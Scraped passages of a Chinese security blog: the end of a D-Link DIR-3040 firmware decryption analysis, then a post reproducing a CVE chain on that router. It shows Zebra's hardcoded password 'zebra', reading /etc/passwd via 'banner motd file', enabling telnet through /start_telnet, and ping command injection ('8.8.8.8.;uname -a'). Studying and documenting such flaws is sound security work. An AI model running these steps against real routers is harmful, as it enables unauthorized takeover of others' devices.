class="line">  MEM = <span class="number">0</span>;</span><br><span class="line">  OUT_MEM = <span class="number">0</span>;</span><br><span class="line">  file_blocks = <span class="number">-1</span>;</span><br><span class="line">  v9 = <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">// 这个hashbuf用于存储SHA512的计算结果，在后面比较会一直被使用到</span></span><br><span class="line">  <span class="built_in">memset</span>(hash_buf, <span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line">  data1_len = <span class="number">0</span>;</span><br><span class="line">  data2_len = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(image_info, <span class="number">0</span>, <span class="keyword">sizeof</span>(image_info));</span><br><span class="line">  IN_MEM = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// 通过stat函数读取加密固件的相关信息写入结构体到image_info，最重要的是文件大小</span></span><br><span class="line">  <span class="keyword">if</span> ( !stat(img_loc, image_info) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 获取文件大小</span></span><br><span class="line">    file_blocks = image_info[<span class="number">13</span>];</span><br><span class="line">    <span class="comment">// 以只读打开加密固件</span></span><br><span class="line">    image_fp = open(img_loc, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( image_fp &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 将加密固件映射到内存中</span></span><br><span class="line">      MEM = (_DWORD *)mmap(<span class="number">0</span>, file_blocks, <span class="number">1</span>, <span class="number">1</span>, image_fp, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( MEM )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 以O_RDWR | O_NOCTTY获得解密后固件应该存放的文件描述符</span></span><br><span class="line">        out_image_fp = open(out_image_loc, <span class="number">258</span>);</span><br><span class="line">        <span class="keyword">if</span> ( out_image_fp &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v9 = file_blocks;</span><br><span class="line">          <span class="comment">// 比较写入到内存的大小和固件的真实大小是否相同</span></span><br><span class="line">          <span class="keyword">if</span> ( file_blocks - <span class="number">1</span> == lseek(out_image_fp, file_blocks - <span class="number">1</span>, <span class="number">0</span>) )</span><br><span class="line">          &#123;</span><br><span class="line">            write(out_image_fp, &amp;unk_402EDC, <span class="number">1</span>);</span><br><span class="line">            close(out_image_fp);</span><br><span class="line">            out_image_fp = open(out_image_loc, <span class="number">258</span>);</span><br><span class="line">            <span class="comment">// 以加密固件的文件大小，将待解密的固件映射到内存中，返回内存地址OUT_MEM</span></span><br><span class="line">            OUT_MEM = mmap(<span class="number">0</span>, v9, <span class="number">3</span>, <span class="number">1</span>, out_image_fp, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ( OUT_MEM )</span><br><span class="line">            &#123;</span><br><span class="line">              IN_MEM = MEM;                     <span class="comment">// 重新赋值指针</span></span><br><span class="line">              <span class="comment">// 检查固件的Magic，通过查看HEX可以看到加密固件的开头有SHRS魔数</span></span><br><span class="line">              <span class="keyword">if</span> ( check_magic((<span class="type">int</span>)MEM) )      <span class="comment">// 比较读取到的固件信息中含有SHRS</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="comment">// 获得解密后固件的大小</span></span><br><span class="line">                data1_len = htonl(IN_MEM[<span class="number">2</span>]);  </span><br><span class="line">                data2_len = htonl(IN_MEM[<span class="number">1</span>]);	</span><br><span class="line">                <span class="comment">// 从加密固件的1756地址起，计算data1_len个字节的SHA512，也就是解密后固件大小的消息摘要，并保存到hash_buf</span></span><br><span class="line">                sub_400C84((<span class="type">int</span>)(IN_MEM + <span class="number">0x6dc</span>), data1_len, (<span class="type">int</span>)hash_buf);</span><br><span class="line">                <span class="comment">// 比较原始固件从156地址起，64个字节大小，和hash_buf中的值进行比较，也就是和加密固件头中预保存的真实加密固件大小的消息摘要比较</span></span><br><span class="line">                <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(hash_buf, IN_MEM + <span class="number">0x9c</span>, <span class="number">64</span>) )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">// AES对加密固件进行解密，并输出到OUT_MEM中</span></span><br><span class="line">                  <span class="comment">// 这个地方也可以看出从加密固件的1756地址起就是真正被加密的固件数据，前面都是一些头部信息</span></span><br><span class="line">                  <span class="comment">// 函数逻辑比较简单，就是AES加解密相关，从保存在固件头IN_MEM + 0xc获取解密密钥</span></span><br><span class="line">                  sub_40107C((<span class="type">int</span>)(IN_MEM + <span class="number">0x6dc</span>), data1_len, aes_key, IN_MEM + <span class="number">0xc</span>, OUT_MEM);</span><br><span class="line">                  <span class="comment">// 计算解密后固件的SHA_512消息摘要</span></span><br><span class="line">                  sub_400C84(OUT_MEM, data2_len, (<span class="type">int</span>)hash_buf);</span><br><span class="line">                  <span class="comment">// 和存储在原始加密固件头，从92地址开始、64字节的SHA512进行比较</span></span><br><span class="line">                  <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(hash_buf, IN_MEM + <span class="number">0x5c</span>, <span class="number">64</span>) )</span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="comment">// 获取解密固件+aes_key的SHA512</span></span><br><span class="line">                    sub_400D24(OUT_MEM, data2_len, aes_key, (<span class="type">int</span>)hash_buf);</span><br><span class="line">                    <span class="comment">// 和存储在原始固件头，从28地址开始、64字节的SHA512进行比较</span></span><br><span class="line">                    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(hash_buf, IN_MEM + <span class="number">0x1c</span>, <span class="number">64</span>) )</span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="comment">// 使用当前文件系统内的公钥，通过RSA验证消息摘要和签名是否匹配</span></span><br><span class="line">                      <span class="keyword">if</span> ( sub_400E78((<span class="type">int</span>)(IN_MEM + <span class="number">0x5c</span>), <span class="number">64</span>, (<span class="type">int</span>)(IN_MEM + <span class="number">0x2dc</span>), <span class="number">0x200</span>) == <span class="number">1</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        <span class="keyword">if</span> ( sub_400E78((<span class="type">int</span>)(IN_MEM + <span class="number">0x9c</span>), <span class="number">64</span>, (<span class="type">int</span>)(IN_MEM + <span class="number">0x4dc</span>), <span class="number">0x200</span>) == <span class="number">1</span> )</span><br><span class="line">                          v5 = <span class="number">0</span>;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                          v5 = <span class="number">-1</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                      &#123;</span><br><span class="line">                        v5 = <span class="number">-1</span>;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      <span class="built_in">puts</span>(<span class="string">&quot;check sha512 vendor failed\r&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;check sha512 before failed %d %d\r\n&quot;</span>, data2_len, data1_len);</span><br><span class="line">                    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i )</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, (<span class="type">unsigned</span> __int8)hash_buf[i]);</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">64</span>; ++i )</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;%02X&quot;</span>, *((<span class="type">unsigned</span> __int8 *)IN_MEM + i + <span class="number">92</span>));</span><br><span class="line">                    <span class="built_in">puts</span>(<span class="string">&quot;\r&quot;</span>);</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="built_in">puts</span>(<span class="string">&quot;check sha512 post failed\r&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;no image matic found\r&quot;</span>);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( MEM )</span><br><span class="line">    munmap(MEM, file_blocks);</span><br><span class="line">  <span class="keyword">if</span> ( OUT_MEM )</span><br><span class="line">    munmap(OUT_MEM, v9);</span><br><span class="line">  <span class="keyword">if</span> ( image_fp &gt;= <span class="number">0</span> )</span><br><span class="line">    close(image_fp);</span><br><span class="line">  <span class="keyword">if</span> ( image_fp &gt;= <span class="number">0</span> )</span><br><span class="line">    close(image_fp);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="概述DIR-3040的固件组成以及解密验证逻辑"><a href="#概述DIR-3040的固件组成以及解密验证逻辑" class="headerlink" title="概述DIR 3040的固件组成以及解密验证逻辑"></a>概述DIR 3040的固件组成以及解密验证逻辑</h3><p>从上面最关键的解密函数逻辑分析中，可以知道如果仅仅是解密相关，实际上只用到了AES解密，而且还是使用的硬编码密钥（通过了一些计算）。只是看上面的解密+验证逻辑分析，对整个流程可能还是会有点混乱，下面就说一下加密固件的文件结构和总结一下上面的解密+验证逻辑。</p>
<p>先直接给出加密固件文件结构的结论，只展现出重要的Header内容，大小1756字节，其后全部是真正的被加密固件数据。</p>
<table>
<thead>
<tr>
<th>起始地址</th>
<th>长度（Bytes）</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>0：0x00</td>
<td>4</td>
<td>魔数：SHRS</td>
</tr>
<tr>
<td>4：0x4</td>
<td>4</td>
<td>解密固件的大小，带填充</td>
</tr>
<tr>
<td>8：0x8</td>
<td>4</td>
<td>解密固件的大小，不带填充</td>
</tr>
<tr>
<td>12：0xC</td>
<td>16</td>
<td>AES_128_CBC解密密钥</td>
</tr>
<tr>
<td>28：0x1C</td>
<td>64</td>
<td>解密后固件+KEY的SHA512消息摘要</td>
</tr>
<tr>
<td>92：0x5C</td>
<td>64</td>
<td>解密后固件的SHA512消息摘要</td>
</tr>
<tr>
<td>156：0x9C</td>
<td>64</td>
<td>加密固件的SHA512消息摘要</td>
</tr>
<tr>
<td>220：0xDC</td>
<td>512</td>
<td>未使用</td>
</tr>
<tr>
<td>732：0x2DC</td>
<td>512</td>
<td>解密后固件消息摘要的数字签名</td>
</tr>
<tr>
<td>1244：0x4DC</td>
<td>512</td>
<td>加密后固件消息摘要的数字签名</td>
</tr>
</tbody></table>
<p>结合上面的加密固件文件结构，再次概述一下解密逻辑：</p>
<ol>
<li><p>判断加密固件是否以Magic Number：SHRS开始。</p>
</li>
<li><p>判断（加密固件中存放的，真正被加密的固件数据大小的SHA512消息摘要），和，（去除Header之后，数据的SHA512消息摘要）。</p>
<p>这一步是通过验证固件的文件大小，判定是否有人篡改过固件，如果被篡改，解密失败。</p>
</li>
<li><p>读取保存在Header中的AES解密密钥，对加密固件数据进行解密</p>
</li>
<li><p>计算（解密后固件数据的SHA512消息摘要），和（预先保存在Header中的、解密后固件SHA512消息摘要）进行对比</p>
</li>
<li><p>计算（解密固件数据+解密密钥的、SHA512消息摘要），和（预先保存在Header中的、解密后固件数据+解密密钥的、SHA512消息摘要）进行对比</p>
</li>
<li><p>使用保存在当前文件系统中的RSA公钥，验证解密后固件的消息摘要和其签名是否匹配</p>
</li>
<li><p>使用保存在当前文件系统中的RSA公钥，验证加密后固件的消息摘要和其签名是否匹配</p>
</li>
</ol>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这篇文章主要是以DIR 3040固件为例，说明如何从未加密的老固件中去寻找负责解密的可执行文件，用于解密新版的加密固件。先说明拿到一个固件后如何判断已经被加密，然后说明如何去找到负责解密的可执行文件，再通过qemu仿真去执行解密程序，将固件解密，最后简单说了下固件完整性相关的知识，并重点分析了解密程序的解密+验证逻辑。</p>
<p>这次对于DIR 3040的漏洞分析和固件解密验证过程分析还是花费了不少的时间。首先是固件的获取，从官网下载到的固件是加密的，然后看到一篇文章简单说了下基于未加密固件版本对加密固件进行解密，也是DIR 3040相关的。但是我在官网上没有找到未加密的固件，全部是被加密的固件。又在信息搜集的过程中，发现了原来在Github上有一个比较通用的、针对D-Link系列的<a target="_blank" rel="noopener" href="https://github.com/0xricksanchez/dlink-decrypt">固件解密脚本</a>。原来，Dlink近两年使用的加密、验证程序imgdecrypt基本上都是一个套路，于是我参考了解密脚本开发者在2020年的分析思路，结合之前看过的关于可信计算相关的一些知识点，简单叙述了固件安全性，然后重点分析了解密验证逻辑如上。</p>
<p>关于漏洞分析，感兴趣的师傅可以看一下我的这篇<a target="_blank" rel="noopener" href="https://genteeldevil.github.io/2021/07/23/D-Link%20DIR%203040%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0RCE/">分析文章</a>。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
<li><a target="_blank" rel="noopener" href="https://0x00sec.org/t/breaking-the-d-link-dir3060-firmware-encryption-recon-part-1/21943">Breaking the D-Link DIR3060 Firmware Encryption</a></li>
<li><a target="_blank" rel="noopener" href="https://genteeldevil.github.io/2021/07/23/D-Link%20DIR%203040%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%88%B0RCE/">D-Link DIR 3040从信息泄露到RCE</a></li>
</ul>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/12/dlink%20dir3040%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0RCE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="OneShell">
      <meta itemprop="description" content="菜">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="OneShell">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/04/12/dlink%20dir3040%E4%BB%8E%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E5%88%B0RCE/" class="post-title-link" itemprop="url">dlink dir3040从信息泄漏到RCE</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-04-12 07:14:42 / Modified: 19:20:27" itemprop="dateCreated datePublished" datetime="2023-04-12T07:14:42+08:00">2023-04-12</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/IoT/" itemprop="url" rel="index"><span itemprop="name">IoT</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="D-Link-DIR-3040从信息泄露到RCE"><a href="#D-Link-DIR-3040从信息泄露到RCE" class="headerlink" title="D-Link DIR 3040从信息泄露到RCE"></a>D-Link DIR 3040从信息泄露到RCE</h1><p>7月中旬，Cisco Talos安全研究员Dave MacDaniel公布了D-Link DIR 3040（固件版本1.13B03）的多个CVE漏洞的具体利用细节，这些漏洞环环相扣，从硬编码密码导致的信息泄露一步步到无需认证的RCE，具体的漏洞编号和漏洞描述如下：</p>
<ul>
<li>CVE-2021-12817：Zebra服务因读取任意文件设置登录banner导致的敏感信息泄露</li>
<li>CVE-2021-12818：Zebra服务使用硬编码密码zebra</li>
<li>CVE-2021-12819：可通过访问https:&#x2F;&#x2F;<router_ip>&#x2F;start_telnet开启telnet，并使用管理员密码登录，其中提供的功能例如ping存在命令注入</li>
</ul>
<p>从这三个漏洞的描述就可以看出攻击链大概就是：先使用Zebra硬编码密码登录，然后通过读取任意文件窃取管理员admin密码，再开启telnet，最后实现命令注入，将一个本来是后认证的RCE组合变成了无条件RCE。下面就先直接上图说明漏洞利用的可行性，然后再进行原理的分析。</p>
<h2 id="攻击链复现"><a href="#攻击链复现" class="headerlink" title="攻击链复现"></a>攻击链复现</h2><p>我手头上是有一个部署在公网的路由器DIR 3040，一开始端口是没有开启telnet的，下图是我复现漏洞成功后，没有关闭telnet。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">oneshell @ UbuntuDev <span class="keyword">in</span> ~ [23:44:30] C:130</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -Pn X.X.X.X</span></span><br><span class="line"></span><br><span class="line">Starting Nmap 7.60 ( https://nmap.org ) at 2021-07-22 23:44 PDT</span><br><span class="line">Nmap scan report for XXX.XXX.com (X.X.X.X)</span><br><span class="line">Host is up (0.28s latency).</span><br><span class="line">Not shown: 995 filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">23/tcp   open  telnet</span><br><span class="line">53/tcp   open  domain</span><br><span class="line">80/tcp   open  http</span><br><span class="line">443/tcp  open  https</span><br><span class="line">2602/tcp open  ripd</span><br></pre></td></tr></table></figure>

<p>首先使用telnet登录开启了Zebra的2601端口，使用硬编码密码zebra，实际上也是服务的默认密码，Zebra使用默认密码在06年的时候就爆出来过一些。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">oneshell @ UbuntuDev <span class="keyword">in</span> ~ [23:42:09] C:1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">telnet X.X.X.X 2601</span></span><br><span class="line">Trying X.X.X.X...</span><br><span class="line">Connected to X.X.X.X.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">          ___           ___           ___</span><br><span class="line">         /__/\         /  /\         /  /\</span><br><span class="line">        _\_ \:\       /  /::\       /  /:/_</span><br><span class="line">       /__/\ \:\     /  /:/\:\     /  /:/ /\</span><br><span class="line">      _\_ \:\ \:\   /  /:/~/:/    /  /:/ /::\</span><br><span class="line">     /__/\ \:\ \:\ /__/:/ /:/___ /__/:/ /:/\:\</span><br><span class="line">     \  \:\ \:\/:/ \  \:\/:::::/ \  \:\/:/~/:/</span><br><span class="line">      \  \:\ \::/   \  \::/~~~~   \  \::/ /:/</span><br><span class="line">       \  \:\/:/     \  \:\        \__\/ /:/</span><br><span class="line">        \  \::/       \  \:\         /__/:/</span><br><span class="line">         \__\/         \__\/         \__\/</span><br><span class="line"> -----------------------------------------------------</span><br><span class="line"> BARRIER BREAKER (%C, %R)</span><br><span class="line"> -----------------------------------------------------</span><br><span class="line">  * 1/2 oz Galliano         Pour all ingredients into</span><br><span class="line">  * 4 oz cold Coffee        an irish coffee mug filled</span><br><span class="line">  * 1 1/2 oz Dark Rum       with crushed ice. Stir.</span><br><span class="line">  * 2 tsp. Creme de Cacao</span><br><span class="line"> -----------------------------------------------------</span><br><span class="line"></span><br><span class="line">User Access Verification</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line"><span class="meta prompt_">Router&gt; </span><span class="language-bash"><span class="built_in">enable</span></span></span><br><span class="line">Password:</span><br><span class="line"><span class="meta prompt_">Router# </span><span class="language-bash">configure terminal</span></span><br><span class="line"><span class="meta prompt_">Router(config)# </span><span class="language-bash">banner motd file /etc/passwd</span></span><br><span class="line"><span class="meta prompt_">Router(config)# </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Router# </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">Connection closed by foreign host.</span><br></pre></td></tr></table></figure>

<p>使用telnet再次登录，就会发现，登录提示的banner已经把&#x2F;etc&#x2F;passwd文件显示出来了。在&#x2F;etc&#x2F;passwd中的密码是以md5的形式保存的，有能力的师傅可以尝试解出来，但是，admin的明文账号密码是被保存在&#x2F;var&#x2F;2860_data.dat文件中的，那么设置banner到这个文件就可以成功读取到admin的明文密码，为下一步的认证RCE做准备。</p>
<p>这个时候访问https:&#x2F;&#x2F;<router_ip>&#x2F;start_telnet开启路由器的测试CLI，这个页面访问的结果返回是404，不用担心，已经成功开启了设备的telnet了。然后可以使用上一步得到的admin账号密码登录，然后也可以看到，在ping那个功能处存在命令注入。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">oneshell @ LAPTOP-M8H23J7M <span class="keyword">in</span> ~ [14:54:22] C:1</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">telnet X.X.X.X</span></span><br><span class="line">Trying X.X.X.X...</span><br><span class="line">Connected to X.X.X.X.</span><br><span class="line">Escape character is &#x27;^]&#x27;.</span><br><span class="line">D-Link login: admin</span><br><span class="line">Password:</span><br><span class="line">libcli test environment</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">router&gt; </span><span class="language-bash"><span class="built_in">help</span></span></span><br><span class="line"></span><br><span class="line">Commands available:</span><br><span class="line">  help                 Show available commands</span><br><span class="line">  quit                 Disconnect</span><br><span class="line">  history              Show a list of previously run commands</span><br><span class="line">  protest              protest cmd</span><br><span class="line">  iwpriv               iwpriv cmd</span><br><span class="line">  ifconfig             ifconfig cmd</span><br><span class="line">  iwconfig             iwconfig cmd</span><br><span class="line">  reboot               reboot cmd</span><br><span class="line">  brctl                brctl cmd</span><br><span class="line">  ated                 ated cmd</span><br><span class="line">  ping                 ping cmd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">router&gt; </span><span class="language-bash">ping -c 1 8.8.8.8.;<span class="built_in">uname</span> -a</span></span><br><span class="line">ping: bad address &#x27;8.8.8.8.&#x27;</span><br><span class="line">Linux D-Link 3.10.14+ #1 SMP Fri Aug 14 18:42:10 CST 2020 mips GNU/Linux</span><br></pre></td></tr></table></figure>

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞的利用顺序是从CVE-2021-12818到CVE-2021-12817再到CVE-2021-12819，分析顺序也是按照这个来进行。顺便强调一下，这篇文章是偏向于分析，很多线索都是基于已有的漏洞信息来进行推断的，然后菜菜的我尽量去揣测挖洞大佬是怎么找出这个漏洞的，并说出自己猜测的思路，如果有不正确或者师傅们有更好的思路，还望指出来，蟹蟹！</p>
<h3 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h3><p>第一步是获取到存在漏洞的固件，固件已经是最新固件了。关于从固件中提取文件系统，可以参考我之前写的这篇文章：<a target="_blank" rel="noopener" href="https://genteeldevil.github.io/2021/07/22/%E5%8A%A0%E5%AF%86%E5%9B%BA%E4%BB%B6%E4%B9%8B%E4%BE%9D%E6%8D%AE%E8%80%81%E5%9B%BA%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86/">加密固件之依据老固件进行解密</a>。下面说一下如何从文件系统中先对整个路由器有个大致的了解。这个地方推荐使用<a target="_blank" rel="noopener" href="https://github.com/craigz28/firmwalker">FirmWalker</a>，一个对固件进行简单分析的sh脚本。分析的出来的结果太多了，就不展示出来，直接简单说一下分析结果：</p>
<ul>
<li>后台使用的是lighttpd，一个常见的嵌入式后端。</li>
<li>看到有使用sqlite3的so，可能使用到了相关的，不知道有没有命令注入的可能。</li>
<li>有telnetd程序，可以通过telnet登录；有tftp、curl，可以用于下载文件，例如针对路由器架构编译的恶意程序。</li>
</ul>
<h3 id="CVE-2021-12818：Zebra服务硬编码密码"><a href="#CVE-2021-12818：Zebra服务硬编码密码" class="headerlink" title="CVE-2021-12818：Zebra服务硬编码密码"></a>CVE-2021-12818：Zebra服务硬编码密码</h3><p>这个漏洞是Zebra服务使用了默认密码zebra。Zebra 是一个 IP 路由管理器，可提供内核路由表更新、接口查找以及不同路由协议之间路由的重新分配。DIR-3040 默认在TCP端口2601上运行此服务，任何人都可以访问。漏洞披露者的分析应该是建立在通过UART等方式或者手中还有RCE漏洞获取shell查看到的，此处分析不了就直接进行后验证，直接通过前面的命令注入漏洞查看配置文件&#x2F;tmp&#x2F;zebra.conf</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">router&gt; </span><span class="language-bash">ping -c -1 8.8.8.8;<span class="built_in">cat</span> /tmp/zebra.conf</span></span><br><span class="line">ping: invalid number &#x27;-1&#x27;</span><br><span class="line">hostname Router</span><br><span class="line">password zebra</span><br><span class="line">enable password zebra</span><br></pre></td></tr></table></figure>

<h3 id="CVE-2021-12817：敏感信息泄露"><a href="#CVE-2021-12817：敏感信息泄露" class="headerlink" title="CVE-2021-12817：敏感信息泄露"></a>CVE-2021-12817：敏感信息泄露</h3><p>Zebra提供了一个功能就是从指定目录的文件内容，设置登录提示的banner，通过这个功能可以读取敏感信息并显示。通过find找到zebra和zebli.so，分别在&#x2F;sbin&#x2F;zebra和&#x2F;lib&#x2F;libzebra.so.1.0.0中，然后可以通过IDA搜索关键字符，例如在libzebra.so中就找到了和banner相关的数据结构。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.data:0006D608 banner_motd_file_cmd:.word aBannerMotdFile_1</span><br><span class="line">.data:0006D608                                          # DATA XREF: LOAD:00003AC0↑o</span><br><span class="line">.data:0006D608                                          # cmd_init+708↑o ...</span><br><span class="line">.data:0006D608                                          # &quot;banner motd file [FILE]&quot;</span><br><span class="line">.data:0006D60C                 .word sub_1509C</span><br><span class="line">.data:0006D610                 .word aSetBannerBanne    # &quot;Set banner\nBanner for motd\nBanner fro&quot;...</span><br><span class="line">.data:0006D614                 .align 4</span><br><span class="line">.data:0006D620                 .globl no_config_log_timestamp_precision_cmd</span><br></pre></td></tr></table></figure>

<p>这个数据结构在cmd_init是这样进行引用的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">install_element(<span class="number">5</span>, (<span class="type">int</span>)&amp;banner_motd_file_cmd);</span><br></pre></td></tr></table></figure>

<p>zebra是一个开源项目，源代码官网ftp已经没有了，在GitHub上找到了一个<a target="_blank" rel="noopener" href="https://github.com/zhouyangchao/zebra-dev">备份</a>，也可以找到install_element的函数以及cmd_element结构体定义如下：</p>
